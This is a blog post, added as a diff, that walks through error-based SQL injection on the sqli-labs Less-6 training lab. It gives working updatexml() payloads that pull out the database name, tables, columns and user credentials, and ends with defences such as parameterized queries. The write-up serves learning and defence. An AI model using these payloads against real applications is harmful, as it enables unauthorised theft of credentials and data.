@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>sqli-labs Less-6：双引号报错注入学习记录 | 与猫为邻的小站</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.woff2"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><meta name="page-config" content="{&quot;code_fold&quot;:null}"><script class="pjax-js">var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}};
+var page_config = {
+  code_fold: null
+};
+function updatePageConfig() {
+  var newPageConfig = document.querySelector('meta[name="page-config"]');
+  if (newPageConfig) {
+    page_config = JSON.parse(newPageConfig.content);
+  }
+}
+document.addEventListener('pjax:complete', function() { updatePageConfig(); });
+updatePageConfig();</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><style defer src="/css/music-player.css"></style><link rel="stylesheet" href="/css/music-player.css"><style defer src="/css/live2d-anan.css?v=20260512a"></style><link rel="stylesheet" href="/css/live2d-anan.css?v=20260512a"><style defer src="/css/friend-links.css?v=20260511b"></style><link rel="stylesheet" href="/css/friend-links.css?v=20260511b"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: '确认'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+const postBg = document.querySelector('#post-bg');
+if (postBg) lightGallery(postBg, {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.vercount','meta[name=page-config]'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 8.1.1"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Link</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>sqli-labs Less-6：双引号报错注入学习记录</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2026-05-18T13:20:00.000Z" id="date"> 2026-05-18</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2026-05-18T13:36:49.538Z" id="updated"> 2026-05-18</time></div></span></div></div><hr><div id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Less-6 是 sqli-labs 中的报错注入关卡，整体思路和 Less-5 非常接近。</p>
+<p>Less-5 和 Less-6 的共同点是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">页面不会直接回显数据库查询结果<br></code></pre></td></tr></table></figure>
+
+<p>正常访问时页面只显示：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">You are in..........<br></code></pre></td></tr></table></figure>
+
+<p>因此，这类关卡不能像 Less-1 到 Less-4 那样直接使用 <code>UNION SELECT</code> 在页面中显示数据，而是需要借助数据库报错信息，把想要查询的内容带出来。</p>
+<p>Less-6 和 Less-5 的核心区别是闭合方式不同：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">Less-5：单引号报错注入<br>Less-6：双引号报错注入<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="一、实验环境"><a href="#一、实验环境" class="headerlink" title="一、实验环境"></a>一、实验环境</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">操作系统：Windows<br>Web 环境：phpStudy / 小皮面板<br>Web 服务：Apache<br>数据库：MySQL 5.7<br>PHP 版本：PHP 5.6<br>靶场：sqli-labs<br>关卡：Less-6<br>访问地址：http://127.0.0.1/sqli-labs/Less-6/<br></code></pre></td></tr></table></figure>
+
+<p>正常访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1<br></code></pre></td></tr></table></figure>
+
+<p>页面显示：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">You are in..........<br></code></pre></td></tr></table></figure>
+
+<p>这说明查询成功，但是页面并没有输出用户名、密码等数据库字段内容。</p>
+<p class='item-img' data-src='/img/less6-normal.png'><img src="/img/less6-normal.png" alt="Less-6 正常访问页面"></p>
+<hr>
+<h2 id="二、漏洞成因分析"><a href="#二、漏洞成因分析" class="headerlink" title="二、漏洞成因分析"></a>二、漏洞成因分析</h2><p>Less-6 的后台 SQL 结构大致类似：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=\&quot;<span class="hljs-subst">$id</span>\&quot; LIMIT 0,1&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>也就是参数 <code>id</code> 被双引号包裹。</p>
+<p>正常访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1<br></code></pre></td></tr></table></figure>
+
+<p>后台 SQL 大致为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>&quot;1&quot; LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure>
+
+<p>如果输入双引号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1&quot;<br></code></pre></td></tr></table></figure>
+
+<p>后台 SQL 可能变成：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span>&quot;1&quot;&quot; LIMIT 0,1;<br></code></pre></td></tr></table></figure>
+
+<p>此时 SQL 语法结构被破坏，数据库会返回报错信息。</p>
+<p>因此 Less-6 的闭合方式是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&quot;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、为什么不能直接使用-UNION-回显"><a href="#三、为什么不能直接使用-UNION-回显" class="headerlink" title="三、为什么不能直接使用 UNION 回显"></a>三、为什么不能直接使用 UNION 回显</h2><p>在 Less-1 到 Less-4 中，页面会直接显示查询结果，例如：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">Your Login name:2<br>Your Password:3<br></code></pre></td></tr></table></figure>
+
+<p>所以可以通过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p>判断回显位。</p>
+<p>但是 Less-6 页面只显示固定提示：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">You are in..........<br></code></pre></td></tr></table></figure>
+
+<p>即使使用类似下面的联合查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=-1&quot; union select 1,2,3--+<br></code></pre></td></tr></table></figure>
+
+<p>页面也不会显示 <code>2</code> 和 <code>3</code>。</p>
+<p>这说明 Less-6 不适合依赖联合查询回显数据，而应该改用报错注入。</p>
+<hr>
+<h2 id="四、报错注入的基本思路"><a href="#四、报错注入的基本思路" class="headerlink" title="四、报错注入的基本思路"></a>四、报错注入的基本思路</h2><p>报错注入的核心是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">故意构造一个会导致数据库报错的函数，并把想要查询的数据拼接到报错信息中。<br></code></pre></td></tr></table></figure>
+
+<p>Less-6 中常用 <code>updatexml()</code> 函数。</p>
+<p>基本结构：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>, 查询内容, <span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">updatexml()<br></code></pre></td></tr></table></figure>
+
+<p>是 MySQL 的 XML 相关函数。</p>
+<p>当第二个参数不是合法的 XPath 表达式时，MySQL 会报错。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">concat()<br></code></pre></td></tr></table></figure>
+
+<p>用于拼接字符串。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x7e<br></code></pre></td></tr></table></figure>
+
+<p>是十六进制形式的 <code>~</code>，用来作为分隔符，让输出结果更明显。</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">concat(<span class="hljs-number">0x7e</span>,database(),<span class="hljs-number">0x7e</span>)<br></code></pre></td></tr></table></figure>
+
+<p>会拼接成：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">~security~<br></code></pre></td></tr></table></figure>
+
+<p>如果触发报错，就能在页面中看到类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">XPATH syntax error: &#x27;~security~&#x27;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、判断数据库名"><a href="#五、判断数据库名" class="headerlink" title="五、判断数据库名"></a>五、判断数据库名</h2><p>Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>浏览器中也可以使用编码后的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>页面返回类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">XPATH syntax error: &#x27;~security~&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>说明当前数据库名为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">security<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/img/less6-database.png'><img src="/img/less6-database.png" alt="Less-6 获取当前数据库名"></p>
+<hr>
+<h2 id="六、获取当前数据库中的表名"><a href="#六、获取当前数据库中的表名" class="headerlink" title="六、获取当前数据库中的表名"></a>六、获取当前数据库中的表名</h2><p>Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>编码后的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>页面返回类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>说明当前数据库中存在以下表：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">emails<br>referers<br>uagents<br>users<br></code></pre></td></tr></table></figure>
+
+<p>其中 <code>users</code> 表通常是本关重点关注的目标表。</p>
+<p class='item-img' data-src='/img/less6-tables.png'><img src="/img/less6-tables.png" alt="Less-6 获取表名"></p>
+<hr>
+<h2 id="七、获取-users-表字段名"><a href="#七、获取-users-表字段名" class="headerlink" title="七、获取 users 表字段名"></a>七、获取 users 表字段名</h2><p>Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>编码后的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#x27;users&#x27;%20and%20table_schema=database()),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>页面返回类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">XPATH syntax error: &#x27;~id,username,password~&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>说明 <code>users</code> 表中存在以下字段：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">id<br>username<br>password<br></code></pre></td></tr></table></figure>
+
+<p class='item-img' data-src='/img/less6-columns.png'><img src="/img/less6-columns.png" alt="Less-6 获取字段名"></p>
+<hr>
+<h2 id="八、读取-users-表数据"><a href="#八、读取-users-表数据" class="headerlink" title="八、读取 users 表数据"></a>八、读取 users 表数据</h2><p>可以尝试一次性读取所有用户名和密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>编码后的写法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1%22%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username,0x3a,password)%20from%20users),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>其中：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">0x3a<br></code></pre></td></tr></table></figure>
+
+<p>表示英文冒号 <code>:</code>，用于分隔用户名和密码。</p>
+<p>页面可能返回类似：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">XPATH syntax error: &#x27;~Dumb:Dumb,Angelina:I-kill-you,D...&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>这里需要注意，报错信息长度有限，如果一次性查询的数据太长，结果可能会被截断。</p>
+<p class='item-img' data-src='/img/less6-data.png'><img src="/img/less6-data.png" alt="Less-6 读取 users 表数据"></p>
+<hr>
+<h2 id="九、使用-limit-分条读取数据"><a href="#九、使用-limit-分条读取数据" class="headerlink" title="九、使用 limit 分条读取数据"></a>九、使用 limit 分条读取数据</h2><p>由于报错信息可能被截断，所以更稳定的方法是使用 <code>limit</code> 一条一条读取。</p>
+<p>读取第一条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>读取第二条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 1,1),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>读取第三条：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 2,1),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>规律如下：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">limit 0,1  读取第 1 条<br>limit 1,1  读取第 2 条<br>limit 2,1  读取第 3 条<br>limit 3,1  读取第 4 条<br></code></pre></td></tr></table></figure>
+
+<p>这样可以避免一次性读取过长数据导致报错信息截断。</p>
+<hr>
+<h2 id="十、Less-5-与-Less-6-对比"><a href="#十、Less-5-与-Less-6-对比" class="headerlink" title="十、Less-5 与 Less-6 对比"></a>十、Less-5 与 Less-6 对比</h2><table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>Less-5</th>
+<th>Less-6</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>注入类型</td>
+<td>报错注入</td>
+<td>报错注入</td>
+</tr>
+<tr>
+<td>页面是否直接回显数据</td>
+<td>不直接回显</td>
+<td>不直接回显</td>
+</tr>
+<tr>
+<td>闭合方式</td>
+<td>单引号 <code>&#39;</code></td>
+<td>双引号 <code>&quot;</code></td>
+</tr>
+<tr>
+<td>常用函数</td>
+<td><code>updatexml()</code></td>
+<td><code>updatexml()</code></td>
+</tr>
+<tr>
+<td>获取数据方式</td>
+<td>通过报错信息带出</td>
+<td>通过报错信息带出</td>
+</tr>
+</tbody></table>
+<p>Less-5 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>Less-6 示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?id=1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)--+<br></code></pre></td></tr></table></figure>
+
+<p>两者本质区别只有闭合字符不同。</p>
+<hr>
+<h2 id="十一、防御方法"><a href="#十一、防御方法" class="headerlink" title="十一、防御方法"></a>十一、防御方法</h2><p>Less-6 的漏洞本质仍然是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">用户输入被直接拼接进 SQL 语句<br></code></pre></td></tr></table></figure>
+
+<p>正确防御方式包括：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">1. 使用参数化查询，避免字符串拼接 SQL<br>2. 对输入参数进行类型校验<br>3. 关闭生产环境数据库报错回显<br>4. 限制数据库账号权限<br>5. 避免使用 root 账号连接业务数据库<br>6. 对敏感数据进行哈希存储<br></code></pre></td></tr></table></figure>
+
+<p>例如使用参数化查询：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);<br><span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$id</span>]);<br></code></pre></td></tr></table></figure>
+
+<p>参数化查询会把用户输入当作数据处理，而不是当作 SQL 语句的一部分执行，从根本上降低 SQL 注入风险。</p>
+<hr>
+<h2 id="十二、总结"><a href="#十二、总结" class="headerlink" title="十二、总结"></a>十二、总结</h2><p>Less-6 是一个典型的双引号报错注入关卡。</p>
+<p>它和 Less-5 的整体思路完全一致，都是在页面没有直接回显位的情况下，通过 <code>updatexml()</code> 构造数据库报错，并将查询结果拼接进报错信息中显示出来。</p>
+<p>Less-6 最关键的点是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">使用双引号闭合参数<br></code></pre></td></tr></table></figure>
+
+<p>核心流程可以概括为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">判断闭合方式 → 构造 updatexml 报错 → 获取数据库名 → 获取表名 → 获取字段名 → 读取数据<br></code></pre></td></tr></table></figure>
+
+<p>Less-1 到 Less-4 主要练习的是联合查询注入，Less-5 和 Less-6 则开始进入报错注入。理解这一变化后，后续学习盲注和时间注入会更容易。</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2026/05/13/sqli-labs-less-2/">sqli-labs Less-2：数字型联合查询注入学习记录 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">与猫为邻</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/YuMaoWeiLin"><i class="fab fa-github" alt="GitHub"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">一、实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">二、漏洞成因分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E8%83%BD%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8-UNION-%E5%9B%9E%E6%98%BE"><span class="toc-number">4.</span> <span class="toc-text">三、为什么不能直接使用 UNION 回显</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">四、报错注入的基本思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">6.</span> <span class="toc-text">五、判断数据库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="toc-number">7.</span> <span class="toc-text">六、获取当前数据库中的表名</span></a></li><li class="toc-item toc-level-2"><a 